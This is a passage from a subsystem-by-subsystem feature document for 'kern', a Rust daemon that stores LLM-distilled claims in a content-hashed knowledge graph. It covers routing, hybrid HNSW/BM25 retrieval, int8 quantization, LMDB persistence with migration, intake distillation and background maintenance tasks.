# Features

A full technical scrape of everything that actually exists in the kern source
today. Organized by subsystem. For each: **what** it does, **how** it works,
**where** it lives in the code, and **gaps** (known limitations / improvement
opportunities). Version: `2.0.0`. LoC ~63.6k (raw `wc -l`, tracked) across 128 `.rs` files in a 24-crate workspace.

State legend: `active` (runs today), `building` (wired but partial/unverified),
`off` (present but disabled by default).

---

## 0. Architecture at a glance

```
session delta (.txt) ──► intake ──► distill (LLM) ──► typed claims
                                                               │
                            kern tree (content-hash ids) ◄─────┘ accept()
                                   │            │
                              reason edges    access heat
                                   │            │
   ┌── CLI verbs ──► KernRpc `invoke` (typed local socket) ────────┐
   │            ▲                  │                 ▲              │
   │        query pipeline ◄───────┴──────────►  recall            │
   │  (HNSW+BM25 seed → expand → RRF+PageRank → MMR → passages)    │
   │                                                                │
   │   tick queue ──► cluster / name / enrich / gc / gnn / persist  │
   │                                                                │
   └── LMDB ◄── hot graph + cold tier, one env per data dir ────────┘
```

One daemon per working directory (gated on `.kern/`). Everything below is the
single process that owns that directory's graph.

---

## 1. Graph data model — `active`

**What.** Two node kinds: *thoughts* (`Entity`, typed) and *justified edges*
(`Reason`). Ids are content hashes — identical content is the same node
everywhere, which is what makes conflict-free cross-node merge work.

**How.**

- `Entity` (`src/base/src/base_types.rs:276`) — typed (`Fact`/`Claim`/`Document`/
  `Question`/`Conclusion`, `src/base/src/base_types.rs:19`), weighted by
  confidence (a beta distribution stored as `conf_alpha`/`conf_beta`, read via
  the `conf_mean`/`conf_variance` methods, updated via
  `observe_support`/`observe_contradict`)
  - access `heat`. Carries a bi-temporal window (`valid_from`/`valid_to`,
  `created_at`), `status` (`Active`/`Superseded`), `superseded_by`, `statements`
  (OR-Set of text lines), two vectors (`vector` content, `gnn_vector` structure),
  and provenance (`Source` with `system`/`object_id`/`section`/`title`/`author`/
  `url`). `kind`/`source` parsed off the source string. There is **no per-row
  ACL and no user identity**: kern is a single-trust-domain store, the process
  boundary (socket ownership — path uid + `SO_PEERCRED`, `src/transport/src/typed.rs`)
  is the whole access model, and any
  multi-caller scoping is the embedding host's job (decision 2026-07-22,
  `CHANGELOG.md`).
- `Reason` (`src/base/src/base_types.rs:442`) — an edge `from`→`to` with a `kind`
  (`Similarity`/`Provenance`/`Question`/`Spawn`/`Supersedes`/`Ratification`/
  `Rephrase`, `src/base/src/base_types.rs:89-98`), its own vector (mean of endpoints), a
  `traversal_count` GCounter (`src/base/src/base_types.rs:454`), and a CRDT `score`.
  an `is_enriched` flag (`is_remote` and `to_net_id` left with federation,
  2026-08-16). There is no `Contradiction` edge kind —
  `Related` is a `ContradictionClass` verdict, not an edge, and a deferred
  contradiction candidate is carried by a `Rephrase` edge.
- `Kern` (`src/base/src/base_types.rs:485`) — a container node in the kern tree:
  `entities` + `reasons` maps, `children` ids, a `graviton_vec`/`graviton_text` + `mass` (default 1.0),
  radii (`inner_radius`/`outer_radius`) for acceptance gating, and an
  `access_count`. Root, named children, and unnamed (spill) children are all
  `Kern`s distinguished by `is_unnamed`/`is_named`/`has_graviton`.
- `GraphGnn` (`src/graph/src/graph.rs:142`) — the whole in-memory forest: `kerns`
  map, `root`, `entity_idx` (HNSW over content vectors), `gnn_entity_idx`
  (HNSW over GNN vectors), `entity_adjacency` (reason-edge incidence),
  source routing, a Lamport clock (a plain `AtomicU64` field driven by
  `bump_lamport`/`observe_lamport`, `src/graph/src/graph.rs:467`/`:474` — there is no
  `Lamport` type), a `mutation_epoch`, a `replica_id` (renamed from
  `network_id` when federation left, 2026-08-16 — the `PendingDelta` queue
  went with it), the bound embedding
  model name (`set_embed_model`/`embed_model`, `src/graph/src/graph.rs:282`), and an
  optional bound `Store` (LMDB) for hot/cold tiers + disk fallback.

**Where.** `src/base/src/base_types.rs` (880 LoC), `src/graph/src/graph.rs` (1325 LoC),
`src/graph/src/reason.rs` (edge add/remove/move), `src/graph/src/search.rs` (graph-wide
entity/reason lookup + unlocked vector search).

**Gaps.** `Entity` is a large flat struct (~30 fields); a trait-object or
sharded layout could cut serialization cost. `Kern` carries no per-kern
statistics (mean heat, fill ratio) that clustering could reuse cheaply.

---

## 2. Acceptance & routing — `active`

**What.** Decides where a new thought lives in the tree and whether it
supersedes an existing one. The core write path every ingestion funnels through.

**How** (`src/graph/src/accept.rs:26` `accept()`):

1. **Dedup** — graph-wide top-1 vector search; if `score >` the preset's dedup
   threshold (0.98 on the default `relaxed`; 0.95 medium, 0.90 tight,
   `src/config/src/config.rs`; `DEDUP_EF=64`), the thought is a duplicate and merges
   into the existing entity (no new node).
2. **Route** (`route_entity`, `src/graph/src/accept.rs:218`) — descend from the
   target kern toward a leaf:
   - For each loaded child, route into the one whose graviton is nearest by
     effective distance `cosine_distance / mass` (`mass` default `1.0`,
     `1e-6` epsilon floor) — heavier gravitons both attract and retain.
   - At the **root** (a pure dispatcher): a no-graviton-match falls through to a
     `generic` catch-all child (empty graviton vec, never matches on similarity) —
     the root never commits entities itself.
   - At a **named** kern with a graviton: compute `acceptance_probability`
     (`src/graph/src/accept.rs:895`, softmax over cosine distance vs `inner`/`outer`
     radii); below `ACCEPT_FLOOR` (0.5) → spawn an unnamed child and descend.
   - `MAX_ACCEPT_DEPTH = 64` (`src/graph/src/accept.rs:17`) bounds a runaway descent.
3. **Commit** (`commit_entity`, `src/graph/src/accept.rs:279`) — stamp `root_id`,
   insert into the `entity_idx`/`gnn_entity_idx`, attach a `Similarity` reason to
   the nearest existing neighbor and a `Provenance` reason to the source doc.

**Where.** `src/graph/src/accept.rs` (1452 LoC). Radii defaults in `constants.rs`
(`KERN_INNER_RADIUS=0.35`, `KERN_OUTER_RADIUS=0.75`, `src/base/src/base_constants.rs:40-41`).

**Gaps.** *Both halves of this block were wrong and are corrected 2026-07-21.*
Routing does **no** index lookup per level: `route_to_child_id`
(`src/graph/src/accept.rs:882`) is a linear scan over the parent's loaded, named
children, taking `cosine_distance` against each child's stored `graviton_vec`
directly. The cost is O(depth · children), not O(depth · log n), and the "cached
per-kern centroid" the old wording wanted is what `graviton_vec` already is —
root fan-out is already O(gravitons). The remaining scaling question is the
per-parent fan-out itself, not an index.

Unnamed children are **not** unbounded on the routing path: `route_entity` goes
through `get_or_spawn_unnamed_child` (`src/graph/src/accept.rs:787`), which reuses the
single holding-pen child and auto-loads an evicted one rather than respawning it
(three tests, both holding pens: `src/graph/src/accept.rs:921`, `:940`, `:963`).
Growth comes only from tick clustering, which deliberately spawns one *distinct*
child per spawnable cluster (`spawn_child_clusters`, `src/tick_loop/src/tick.rs:225`) —
bounded per pass by the cluster count, not by anything per parent.

---

## 3. Bi-temporal supersede & contradiction — `active`

**What.** Conflicting claims *supersede* rather than delete. The old revision
stays as history with a stamped `valid_to`; `query` can recover the past via
`as_of` or walk the supersede chain via `include_history`.

**How.**

- `supersede_by_contradiction` (`src/graph/src/accept.rs:562`) — inserts the new
  thought, sets the old `status=Superseded`, `superseded_by=new_id`, and
  `stamp_invalidated(now, new_valid_from)` so the window closes exactly when
  the new claim became true. Removes the old id from both vector indexes (so it
  stops seeding) but keeps it in the kern for history. Adds a `Supersedes`
  reason edge with the averaged vector.
- Classification is LLM-driven (`classify_prompt` `src/graph/src/accept.rs:693` /
  `parse_contradiction` `src/graph/src/accept.rs:703`) and **fails open to `Related`**
  (co-exist) — the conservative choice that never loses data. Driven from the
  tick's `do_classify_contradiction` task (`src/tick_loop/src/tick_tasks.rs:114`) so recall
  stays LLM-free at query time.
- `is_valid_at(instant)` / `valid_from_or_created()` on `Entity` answer
  point-in-time membership; the query layer's `include_history` walks the
  `superseded_by` chain.
- The three stamps survive the **cold tier**. A spilled row is a `ColdRow`
  (`src/store_core/src/lib.rs`) = `Entity` ++ `StoredTemporal`, written under
  `FORMAT_VERSION` and decoded strictly, never by parse-sniffing (`decode_cold`) — a
  truncated value errors instead of silently degrading to a stampless `Entity`. So a
  cold-recovered revision keeps `valid_from`/`valid_to`/`invalidated_at` and
  `is_valid_at` answers over the cold tail exactly as it does over the hot graph.

**Where.** `src/graph/src/accept.rs`, `src/base/src/base_types.rs` (temporal helpers),
`src/store_core/src/lib.rs` (cold-tier round-trip), `src/tick_loop/src/tick_tasks.rs` (background
classification).

**Gaps.** Classification runs once per near-duplicate pair on the tick; a
re-classify when either side changes isn't triggered. No surface exposes
the history chain directly beyond `include_history`.

---

## 4. Retrieval pipeline — `active`

**What.** The hybrid query engine. Hand-rolled end to end (no external ANN or
rerank lib). This is the product's core IP.

**Stages** (`retrieve_profiled`, `src/retrieval/src/retrieval_query.rs`, each checkpoint
profiled via `src/util/src/profile.rs`):

| # | Stage | File | What happens |
| --- | ------- | ------ | -------------- |
| 1 | **Seed dense** | `retrieval/seed.rs` | HNSW top-`k` over a 0.4/0.6 blend of content + GNN vectors (`Weights::for_mode` per `Mode` Hybrid/Vector/Lexical/Reason). Plus `seed_important` — an O(N) scan feeding access/recency (`IMPORTANT_ACCESS_THRESHOLD=3`, `IMPORTANT_MIN_COSINE=0.20`) into both the dense merge and RRF, run once. |
| 2 | **Seed lexical** | `retrieval/seed.rs:86` | BM25 (`LexicalIndex`) candidate list, fused via RRF when `mode==Hybrid`. |
| 3 | **Fuse (RRF)** | `retrieval/fuse.rs` | Reciprocal-rank fusion of dense + lexical + important lists with mode weights. |
| 4 | **PageRank** | `retrieval/pagerank.rs` | Centrality weighting of the fused seeds over the reason graph. |
| 5 | **Expand** | `retrieval/expand.rs:178` | Walk reason edges out from seeds (`PathChain` recording the *why*), scoring neighbors (`score_neighbor`) — plus bounded traversal credit: each examined edge pays its far endpoint `source_score × edge_evidence` (×`traversal_credit_weight`, capped at `traversal_credit_cap`, clamped below the strongest voucher's walk score), which is how a linked neighbour sharing no words with the query reaches the top ranks without ever outranking a direct match. |
| 6 | **Merge** | `retrieval/merge.rs` | Combine seeds + expanded neighbors into `ScoredEntity` list. |
| 7 | **Boosts** | `retrieval/score.rs` | `apply_boosts`: (confidence × score + **QBST** access/recency boost (`qbst`, capped at 0.1, 24h half-life) + `fact_score_boost` (0.3) for Facts) × `source_trust`. `source_trust` is a `RetrievalConfig` map keyed on `Source::scheme()` — `file`, `ticket`, `session`, `agent`, `inline` — empty by default, absent key exactly `1.0`, so an unconfigured kern scores bit-identically. It weights the CHANNEL, never the author: `kern ingest` and an agent's default ingest both write `inline` (`ROADMAP.md` item 20). An unknown key is a `validate` error, not a silent no-op. |
| 7b | **Gravity** | `retrieval/gravity.rs` | Query-time graviton pull: `score += gravity_weight (0.15) * max_over_gravitons(mass * max(0, cos(entity, graviton_vec)))`. Max, not sum — overlapping gravitons never double-count. `gravity_weight=0` disables (early return, zero cost); no gravitons → no-op. Latency only, from the bench deleted in `8d8b19e` and not reproducible: ~+7% p50 with 5 gravitons. No quality claim accompanies it — the retrieval-quality half of that bench is withdrawn under the claim standard (`ROADMAP.md` — "no quality claim of any kind"). |
| 8 | **Filter** | `retrieval/score.rs` | `filter_delivery`: drop superseded; floor at `retrieval.min_deliver_score` (default `0.0` — off); cap at `delivery_cap` = `retrieval.max_deliver_results` (default `25`), or `mmr_pool_size=50` when MMR is on. Both are config fields (`src/config/src/config.rs:860`), not constants. `delivery_cap` is a named function because the CLI reads it too — `cmd_query` sends it as `k` when it routes to a daemon, so the routed and local reads deliver the same number of hits. Query options (source/kind/scheme/time/min_conf) go through `matches_filter` (`retrieval/score.rs`), the single predicate shared with pre-filtered ANN search. |
| 9 | **Dedup by section** | `retrieval/diversify.rs:6` | Collapse near-duplicate sections. |
| 10 | **MMR** | `retrieval/diversify.rs:46` | Maximal-marginal-relevance diversification so the `k` results actually differ. |
| 11 | **Deliver** | `retrieval/query.rs` | Passages + enriched edges + `format_chains` chain text (`QUERY_MAX_CHAINS=5`). (The remote/UNTRUSTED tagging left with federation, 2026-08-16.) Chains answer an active filter too (`retrieve`, same file): a chain renders the TEXT of every entity on it, so filtering only the results left it as a second delivery channel — one touching a withheld entity is dropped whole, since a chain with a hole still says the withheld thought exists and what it connects. The whole read path is LLM-free by design (2026-07-21): the calling agent synthesizes; an in-kern small-model answerer set the quality ceiling and made retrieval untunable. |
| 13 | **Cold backfill** | `src/rpc/src/server.rs:531` | If hot returns `< k`, cold-tier hits (brute-force `Store::cold_search`, `src/store_core/src/lib.rs:629`) fill remaining slots, flagged `cold:true` — each first put through `matches_filter`, because `cold_search` is a raw cosine scan that answers no predicate of its own and an unfiltered fill made spilling an entity the way around every filter the hot path enforces. Skipped on the exact-text fast path, which never embedded a query vector. <!-- docs-check: anchor-ok --> |
| 14 | **Access stamping** | `retrieval/score.rs` | Heat deposits off the hot path: `score::commit_access` stamps delivered hits; the tick's `CommitAccess` task calls `score::commit_access_ids`. |

**Where.** `src/retrieval_*.rs (shim: src/retrieval.rs)` (5182 LoC, 9 files). Entry: `retrieval::query`
(one-shot CLI) and `retrieval::query_locked` (daemon, holds read lock only for
the graph phase; every LLM call runs unlocked).

**Gaps.**

- The O(N) importance scan runs every retrieve; at scale it should be indexed.
- RRF weights and mode blends are config but not auto-tuned.

---

## 5. Indexes — `active`

**What.** Three hand-built approximate/brute indexes backing seed + dedup +
cold backfill.

**How.**

- **HNSW** (`src/graph/src/hnsw.rs`, 1042 LoC) — id-stable, deterministic-build
  graph ANN. `insert` (`:166`) / `delete` (`:136`) / `search` (`:248`) /
  `search_filtered` (`:273`, pre-filtered ANN that shares one filter predicate
  with post-filtering). Quantization-aware: stores `QuantizedVec` (int8) when
  configured. `structure_digest` for parity checks.
- **DiskANN** (`src/graph/src/diskann.rs`, 665 LoC) — disk-resident graph index.
  `build_and_save` (Params `r=32, build_l=64, alpha=1.2`) writes
  `meta.bin`/`vectors.bin`/`graph.bin`; `DiskIndex::open`/`search` (`:385`) /
  `search_hits_filtered` (`:400`). Selected when a kern exceeds `disk_threshold`.
- **BM25 LexicalIndex** (`src/graph/src/lexical.rs:62`) — in-RAM inverted index,
  `k1`/`b` tunable (`set_bm25_params`), `rebuild_from_graph` (`:155`),
  `search`/`search_filtered` (`:100`/`:105`). One document per entity id, built
  by `entity_document` (`:15`) from the entity's statements plus every alternate
  wording a dedup merged onto it, so either wording matches and the entity still
  returns once.
- **VectorBackend** (`src/graph/src/vector_backend.rs`) — enum switch
  (`Resident(HnswIndex)` | `Disk(DiskIndex)`) unifying the search API so the
  retrieval layer is backend-agnostic.

**Where.** `src/{hnsw,diskann,lexical,vector_backend,search}.rs`.

**Gaps.** HNSW delete is not a tombstone — it scrubs inbound edges, nulls the
node and queues the slot; one `scrub_pending` pass per sweep recycles every slot
deleted since the last one, so the cost is the scan, not accumulation.
DiskANN is build-once; incremental updates funnel through
`consolidate_disk_index` on the tick. Lexical index is RAM-only.

---

## 6. Quantization — `active`

**What.** int8 (and float fallback) vector storage + distance, cutting vector
memory ~4×.

**How.** `QuantizationMode` (`None`/`Int8`/`Binary`, `src/math/src/quant.rs:7`; `Binary`
is implemented and tested but deliberately excluded from `parse` (`src/math/src/quant.rs:16`),
so it is not user-selectable — recall floor is too low without rescore),
`QuantizedVec::encode`/`decode`, `quantized_cosine_distance` (`src/math/src/quant.rs:159`)
falling back to a private `float_cosine_distance` (`:171`) across mismatched
modes. `INT8_MAX_ABS=127`. The HNSW index picks the mode at build; both resident
and disk backends honor it.

**Where.** `src/math/src/quant.rs` (476 LoC).

**Gaps.** No int4 / product-quantization path. Scale is fixed at encode time.

---

## 7. Persistence (LMDB) — `active`

**What.** One ACID LMDB env per data dir (`data.mdb` + `lock.mdb`); hot graph
and cold tier live together. Readers never block, writers serialize.

**How.**

- `Store::open` (`src/store_core/src/lib.rs:316`) opens the env (`heed` 0.20);
  `StoredKern`/`StoredVec`/`StoredTemporal`/`ColdRow` are the on-disk bincode
  shapes, each value a version byte followed by a `zstd` frame
  (`encode_at`/`strip_version`, `src/store_core/src/lib.rs`), vectors int8. Exactly one
  live format, `FORMAT_VERSION`; any other version byte is rejected, never
  mis-decoded and never migrated.
- **Guarded flush** (`Store::flush_guarded` `src/store_core/src/lib.rs:573`,
  `persist::flush_guarded` `src/graph/src/persist.rs:128`) — a snapshot carries an
  expected `mutation_epoch`; if disk advanced under us (another writer /
  external edit), the flush is *refused*, the disk rows are *absorbed* back
  (`merge::absorb_graph`), and the flush retries. Prevents a stale in-memory
  snapshot from clobbering newer on-disk state.
- **Embedding stamp.** The store records the model and vector dimension it was
  built with (`EmbedStamp`, its own meta key so an unstamped store reads as
  *unknown*, never as a mismatch). `check_embed_stamp` (`src/store_core/src/lib.rs:419`)
  runs at open via `persist::check_graph_stamp` (`src/graph/src/persist.rs:92`),
  wired from `commands::bind_embed_model`: an **unstamped** store adopts the
  configured model and says so once; a **differing** model or dimension sets a
  durable `embed_mismatch` flag, logs through a `LogThrottle`, and leaves the
  stored stamp intact because it still describes what is on disk. An unreadable
  stamp is treated as unknown, not as unstamped — adopting over it would erase
  the identity of the stored vectors. `kern reembed` stamps the model it
  *actually embedded with*, not the configured one
  (`src/commands/src/commands_reembed.rs:66-80`), so `health` can never report a false identity.
- **Query dimension guard** (`src/graph/src/search.rs:23` `dim_guard`) — `cosine`
  truncates to the shorter side, so an off-model query vector would score noise
  and rank it as recall. Every graph vector search checks the query dimension
  against the indexed one first. Fail-open by design: a rejected query returns
  no hits rather than panicking, but it is *counted*
  (`search::query_dim_rejected`, `src/graph/src/search.rs:15`) and logged throttled,
  because the silent no-op is what let the mismatch hide.
- **Cold tier** — `cold_spill` (`src/store_core/src/lib.rs:624`) / `cold_get` (`:636`) /
  `cold_all` (`:649`) / `cold_put_all` (`:666`) / `cold_search` (`:684`). Rows are
  stored without their vector; the vector lives alone in `COLD_VEC_DB` (`:26`), so
  the full-tier scan scores off raw floats and decodes only the k winners, and
  `cold_get`/`cold_all` rejoin the halves. Bounded by `COLD_MAX_ENTRIES = 50_000`
  — *softly*: both write paths (`:632`, `:676`) call `cold_cap_amortized` (`:728`),
  which skips the scan until the tier passes `max + COLD_CAP_SLACK` (1024, `:20`);
  only then does `cold_cap` (`:739`) sort by `created_at` and cut back to `max`. A
  drop is unrecoverable, so `cold_evicted` (`:780`) feeding `health` is its trace.
- **One-hop migration** (`src/store_core/src/legacy.rs`, 2026-08-16,
  user-directed — amends the alpha "wipe, never migrate" policy in `AGENTS.md`).
  A store written by the previous build is read, not refused: `decode_kern_row`
  and `decode_cold` take an older version byte through *frozen* snapshots of the
  layout that wrote it — decode-only types, nothing in kern may write one — and
  convert forward into current types. The meta rows (epoch, `GraphMeta`, embed
  stamp) go through `decode_layout_stable` instead, because their v10→v11 change
  was `network_id` → `replica_id`, a rename, and bincode is positional so a
  rename is not a layout change. Reading converts in RAM only; the rows on disk
  stay old until something writes, so a read never rewrites a store behind the
  caller's back. `kern migrate` is the explicit rewrite (kern rows + cold tier +
  meta, writer-lock guarded, idempotent); `kern doctor` reports
  `format_older_than_build` until it runs; `store_core::migrated_from()` is the
  process-global both read.
  **The version byte is not self-evidently trustworthy**: f60fbce (2026-08-15)
  added the persisted `Entity.trust_tier` without bumping `FORMAT_VERSION`, so
  two incompatible `Entity` layouts both call themselves version 10. The
  decoders therefore *try* the candidates for a version and require the result
  to carry a kern/entity id — a run of zero bytes decodes as a structurally
  valid empty kern, so "it parsed" is not evidence. What makes this honest going
  forward is `tests/layout_guard.rs`: it pins an FNV checksum of the encoded
  bytes of `StoredKern` and `ColdRow`, so any field added, removed, reordered or
  retyped fails the build with instructions to bump, freeze and re-pin.

- **Compaction** (`compact_dir`, `src/store_core/src/lib.rs:818`) — the only way to
  shrink LMDB's high-water mark; writes a fresh env to a tmp file then
  `swap_compacted` renames with retry. Requires exclusive access (run offline).
- **Snapshots** — `snapshot_for_flush` (`src/graph/src/persist.rs:154`) /
  `FlushSnapshot` capture a consistent point-in-time; the maintenance tick runs
  a mutation-epoch-gated snapshot so crash loss is bounded to one tick interval.

**Where.** `src/store_core/src/lib.rs` (1611 LoC), `src/graph/src/persist.rs` (565 LoC),
`src/graph/src/search.rs` (dimension guard), `src/store/src/registry.rs`
(per-cwd `Registry` of open stores).

**Gaps.** Single-writer is enforced, not assumed — `src/store_core/src/lock.rs` is an advisory
lock `reembed` and `gc` claim or refuse — but `cmd_hub_merge`
(`src/commands/src/commands_admin.rs:1002`) and `maybe_self_heal_store` (`src/commands/src/lib.rs:523`)
still `save_graph_unguarded` holding none. No WAL but LMDB's; compaction is offline.

---

## 8. Intake & distillation (self-learning) — `active`

**What.** A conversation delta (`.txt`) dropped in `.kern/intake/` is drained,
run through one LLM pass, and turned into typed claims ingested into the graph.
Nothing is lost on an LLM outage — the delta stays queued until it succeeds.

**How.**

- **Intake** (`src/ingest/src/ingest_intake.rs`) — `run()` (`:315`) polls `.kern/intake/`,
  `extract_claims` (`:13`) distills, `archive`/`finalize` (`:55`/`:90`) move
  processed deltas to a `done/` dir, `prune_done` (`:99`) ages them out.
- **Distill** (`src/ingest/src/ingest_distill.rs`) — a structured prompt asks the LLM for
  a JSON array of `{text, kind, valid_from?}` where `kind` is one of the 7
  built-in claim kinds (`DEFAULT_KINDS`, `src/ingest/src/ingest_distill.rs:9`) or a
  registered one (`root.claim_kinds`, offered to the LLM by `spawn_intake`'s
  kinds closure). The prompt names today's date (UTC `YYYY-MM-DD` via
  `date_string` in `src/util/src/util.rs`, from a `now: SystemTime` param callers
  pass as `SystemTime::now()`), so a relative-date phrase ("last Tuesday") in
  the delta resolves to an absolute ISO8601 `valid_from` rather than storing
  unresolved (item 50, 2026-07-22).
  `Some([])` = nothing worth keeping (archive); `None` = no LLM
  output (transient outage, retry). `parse_claims` is lenient (finds the JSON
  array anywhere in the output).
- **Worker** (`src/ingest/src/ingest_worker.rs`) — async job queue bounded at
  `QUEUE_CAP` = 64 with no detached send behind it. Three offers: `enqueue`
  refuses when full (`None`, counted as `ingest_queue_refused`), `submit` awaits
  capacity for a producer that can be slowed instead (the file watcher), `run`
  awaits the outcome. The fill is a gauge, not a counter: `queue_depth`
  (`src/ingest/src/ingest_worker.rs:155`) reads the channel's own occupancy and surfaces as
  `ingest_queue_depth` on every health surface (ROADMAP item 30). Owns the embed + accept path. Defers question/contradiction follow-ups to
  the tick via callback closures (`DeferQuestionsFn`/`DeferContradictionFn`).
- **Embed** (`src/ingest/src/ingest_worker.rs`) — batches texts to the embedding endpoint.
- **Dedup** (`src/ingest/src/ingest_dedup.rs`) — `find_duplicate` at the preset's dedup
  threshold (0.98 on the default `relaxed`), `update_existing_entity`.
- **Place / split / direct** — `place.rs` builds chunk `Entity`s
  (`build_chunk_entity`, `chunk_source_id`), `split.rs` chunks by free-text hint
  (LLM-assisted when given), `direct.rs` handles `.kern/intake/direct/` synchronous
  ingest (`drain_direct_once`).
- **Per-source TTL** (`src/ingest_config/src/ingest_config.rs`) — `ingest::Config` carries a
  `valid_until`; `valid_until_from_retention(secs)` is the one conversion from
  the caller's duration to that absolute instant, so the four entrances cannot
  drift. `0`/absent = no TTL; an overflowing duration errors, never a silent
  no-TTL. `new_statement_entity` stamps it on both the document and the chunk
  path (`src/ingest/src/ingest_place.rs:106`, `:242`), where the existing LWW lamport/producer
  stamping and pending delta finally have a writer; the reader half is
  `score::drop_expired`. `DirectJob` carries the resolved instant, which
  `drain_direct_once` overlays per job. The two entrances with no caller to pass
  a flag take a standing policy instead: `[intake]` / `[watcher] retention_secs`
  via `Config::with_retention`, per drain pass and per record so no deadline
  dates to daemon boot, validated at load, never the preset-owned `[ingest]`.
- **File watcher sink** (`src/ingest/src/ingest_file_watcher.rs`) — `KernFileWatcherSink`
  adapts the watcher into ingest jobs, stamping `[watcher] retention_secs`. Since item 30 it parks each record as a durable `DirectJob` first (`:104`, gated on `intake.enabled` — the same flag that spawns the drain) and falls through to `Worker::submit` (`:128`) only when that write fails, so a record still in flight when the daemon dies is re-offered by the next drain instead of lost.
- **Outcome** (`src/ingest/src/ingest_worker.rs`) — `OutcomeStatus` (`Committed`/`Partial`/`Deduped`/`Failed`, `src/ingest/src/ingest_worker.rs`),
  `FailureReport::document_permanent` for non-retryable errors.
- **Status & sidecars** (`src/ingest/src/ingest_intake_status.rs`) — every path that leaves
  a delta queued writes why to `<intake>/errors/<name>.txt` through
  `record_stuck`, cleared on the next success; `scan` reports pending (age +
  last error), quarantined and done. Without this a delta retried forever is
  indistinguishable from one not yet picked up.
- **CLI** (`src/commands/src/commands_intake_cmd.rs`) — `kern intake` (alias `intake
  status`) prints that report; `kern intake drain` forces one pass. It routes to
  the daemon's `intake_drain` tool when one is serving — one drainer, never two
  distilling the same file — and falls back to `drain_locally`, an in-process
  `intake::drain_now` flushed through the same guarded retry as `cmd_ingest`.
  Both share `drain_once` with the daemon loop, and both print the same tail.

**Where.** `src/ingest_* (and src/ingest.rs shim)` (3583 LoC, 13 files). Spawned by `spawn_intake`
(`src/commands/src/lib.rs`); driven manually by `src/commands/src/commands_intake_cmd.rs`.

A **deduped** ingest carries its retention too. `accept::merge_valid_until` is
the one place a `valid_until` decision is written, and all three placement
outcomes reach it: the `find_duplicate` gate in `place.rs` and `commit_entity`'s
`dup` branch in `accept.rs` both funnel through `merge_duplicate`, and a fresh
placement calls it directly *after* accept, on the id that actually entered the
graph. The rule is `min` with `None` as +∞ (`accept::resolve_valid_until`): a
TTL bounds a lifetime, so merging two bounds keeps the **lower** one, which is
commutative and idempotent and therefore converges under any replay order. A
fresh lamport/producer is stamped only when the stored deadline actually moves
or was never stamped, and always against the
**survivor's** id — the discarded incoming entity is never stamped, never
acked back to the caller, and never enters the lexical index. **Known cost:**
ingest can only ever *shorten* a deadline. There is no way to lengthen one
through ingest; that needs an explicit update path, or `forget` + re-ingest.

**Gaps.** Distill prompt is one-shot; long deltas may truncate. No per-kind
prompt tuning. Dedup threshold is global, not per-kind. Retention now reaches
all four entrances, but the file-watcher one is unit-covered only — nothing in
`tests/e2e/` starts a watcher, since it is off by default — and `DirectJob` carries
`valid_until` but drops `valid_from` (item 90).
Separately, a near-duplicate's alternate wording survives only on a `Rephrase`
reason and is indexed neither lexically nor densely (item 94).

---

## 9. Self-compaction (tick) — `active`

**What.** A background task queue drives heat decay, clustering, naming,
enrichment, GC, GNN propagation, and persistence. An idle daemon still
maintains itself.

**How.**

- **Queue** (`src/tick/src/tick_queue.rs`) — bounded (`TICK_QUEUE_CAPACITY=512`) mpsc
  with backpressure, `TaskKind` enum (`src/tick/src/tick_queue.rs:8`: Cluster/Name/
  Enrich/ResolveQuestion/SeedQuestions/ClassifyContradiction/Persist/
  GnnPropagate/StigmergyGc/Reembed/DiskConsolidate/IdleSweep/CommitAccess).
  Records per-task latency, pending/done metrics, and two separate degradation
  counters: `panics` (a task that died) and `failures` (a task that ended early
  and re-enqueues forever), each keeping the most recent `TaskFault`
  (`src/tick/src/tick_queue.rs:38` — kind, kern, message).
- **Driver** (`crate::tick::start`, `src/tick_loop/src/tick.rs:38`) — one async task drains the
  queue and dispatches via `process_task`. Every task runs inside `run_guarded`
  (`src/tick_loop/src/tick.rs:65`), which wraps `process_task` in
  `catch_unwind(AssertUnwindSafe(…))`: a panicking maintenance task now costs
  one task, not decay/GC/persist/clustering/idle-sweep for the rest of the
  process's life. The panic is logged with its kind and kern and recorded via
  `Queue::record_task_panic`; the loop resumes over state the dead task may have
  half-written, which is exactly what the error line says (the graph lock does
  not poison, so `AssertUnwindSafe` is deliberate). A panicking task's duration
  is *not* fed to `task_avg_ms` — averaging work that never finished would make
  the metric lie as failures climb. `tick_sync` (`src/tick_loop/src/tick.rs:332`) is the
  synchronous one-shot variant; `enqueue_all` (`:323`) fans a Cluster task out
  to every non-empty kern.
- **Maintenance tick** (`spawn_maintenance_tick`, `src/commands/src/lib.rs`) — periodic
  driver at `TICK_INTERVAL_SECS=60` (0 = event-driven only): pulses the root,
  gates GC and disk consolidation on clock validity + elapsed interval
  (`crate::tick_pulse::should_run_gc`, `src/tick/src/tick_pulse.rs:52`), enqueues persist.
- **Pulse** (`src/tick/src/tick_pulse.rs`) — `pulse` (`src/tick/src/tick_pulse.rs:15`) fans Cluster tasks out from the root,
  decaying strength by `PULSE_DECAY=0.5` per level; below `PULSE_THRESHOLD=0.05` it
  stops, covering 5 levels. Deposits **no** heat, takes the graph by shared reference.
  Heat decays lazily by age (`heat::decayed`, half-life based), *not* per tick.
- **Cluster** (`src/tick_loop/src/tick_cluster.rs` + `crate::tick::do_cluster`) — `vector_cluster`
  (`src/tick_loop/src/tick_cluster.rs:13`) samples up to `TICK_MAX_CLUSTER_SAMPLE=200`
  entities and groups them; a cluster
  that is `≥ KERN_MIN_CLUSTER_SIZE=10` and `cohesion ≥ KERN_COHESION_THRESHOLD=0.60`
  and not a core cluster spawns a distinct unnamed child and migrates its
  members. Unnamed kerns never spawn (bounds descent). Empty unnamed children
  are evicted back to the parent each pass.
- **Name** (`do_name`, `src/tick_loop/src/tick_tasks.rs:236`) — LLM names an unnamed kern from
  its centroid (`cluster::graviton_prompt`) once it crosses the naming
  thresholds (`KERN_NAMING_COHESION_THRESHOLD=0.50`,
  `KERN_NAMING_MIN_CLUSTER_SIZE=5`).
- **Enrich** (`do_enrich`, `src/tick_loop/src/tick_tasks.rs:315`) — LLM writes the explanatory
  text for an un-enriched reason edge.
- **Resolve question** (`do_resolve`, `src/tick_loop/src/tick_tasks.rs:383`) — open `Question`
  edges (`to` empty) get answered by retrieval; if a hit scores above
  `QUESTION_RESOLVE_THRESHOLD=0.80` the edge is closed.
- **Commit access** (`do_commit_access`, `src/tick_loop/src/tick_tasks.rs:455`) — flushes
  queued access-count/heat updates.
- **Idle sweep** (`src/tick_loop/src/tick_idle.rs`) — graph-global; unloads kerns idle past
  `tick.kern_idle_timeout_secs`. Residency, not forgetting: an unloaded kern is
  persisted first and reloads on next access.
- **Persist / reembed / disk consolidate** — `do_persist`
